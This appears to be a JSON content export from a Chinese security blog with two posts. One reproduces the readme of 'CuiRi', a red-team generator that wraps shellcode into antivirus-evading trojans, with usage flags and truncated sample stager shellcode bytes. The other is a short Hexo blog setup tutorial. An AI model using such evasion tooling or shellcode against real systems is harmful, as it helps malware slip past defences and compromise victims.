/_____(摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马警告：1.本工具仅用于企业内部测试，请勿用于任何非法犯罪活动，否则后果自负2.本工具需要Go语言环境，且使用时需要关闭杀软https://github.com/NyDubh3/CuiRi Author:Dubh3[INFO] Current Version: 1.0Usage of CuiRi.exe: -f string 通过shellcode生成免杀马 -manual 查看shellcode生成方法 CuiRi 支持的 shellcode 格式分为以下两种： 1.C语言字符串格式 shellcode： 12345&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52&quot;&quot;\\x48\\x31\\xd2\\x51\\x65\\x48\\x8b\\x52\\x60\\x56\\x48\\x8b\\x52\\x18\\x48&quot;&quot;\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9&quot;&quot;\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41&quot;&quot;\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48&quot; 2.纯十六进制数值格式 shellcode: 注意：如果是从 Cobalt Strike 中生成的 bin 文件，请单独将 bin 里的十六进制复制保存到一个 txt 文件中。 1234567fce8 8900 0000 6089 e531 d264 8b52 308b520c 8b52 148b 7228 0fb7 4a26 31ff 31c0ac3c 617c 022c 20c1 cf0d 01c7 e2f0 52578b52 108b 423c 01d0 8b40 7885 c074 4a01d050 8b48 188b 5820 01d3 e33c 498b 348b01d6 31ff 31c0 acc1 cf0d 01c7 38e0 75f4037d f83b 7d24 75e2 588b 5824 01d3 668b 0x03 演示：(1) 生成 shellcode (2) 生成免杀马 (3) 免杀效果","categories":[],"tags":[]},{"title":"使用Node.js + Hexo搭建本网站","slug":"hello-world","date":"2022-10-14T14:16:01.000Z","updated":"2023-01-11T16:35:33.800Z","comments":true,"path":"2022/10/14/hello-world/","link":"","permalink":"http://runctf.cn/2022/10/14/hello-world/","excerpt":"","text":"本来是不想写的,硬着头皮写完了. 开始安装Hexo自行安装Node.js并配置环境变量 不多做解释 1$ npm install hexo-cli -g 初始化网站1$ npx hexo init 文件名 安装必备的组件1$ npm install 下载主题1自己去https://hexo.io/themes/找 这不用教了 安装主题1将主题解压到网站根目录的themes文件夹下 配置主题12打开根目录_config.yml配置文件theme:你的主题名 启动Hexo博客12npx hexo s#s是server的缩写 Bye","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://runctf.cn/tags/%E6%8A%80%E6%9C%AF/"},{"name":"游戏","slug":"游戏","permalink":"http://runctf.cn/tags/%E6%B8%B8%E6%88%8F/"},{"name":"ctf","slug":"ctf","permalink":"http://runctf.cn/tags/ctf/"},{"name":"渗透","slug":"渗透","permalink":"http://runctf.cn/tags/%E6%B8%97%E9%80%8F/"},{"name":"栈溢出","slug":"栈溢出","permalink":"http://runctf.cn/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}]}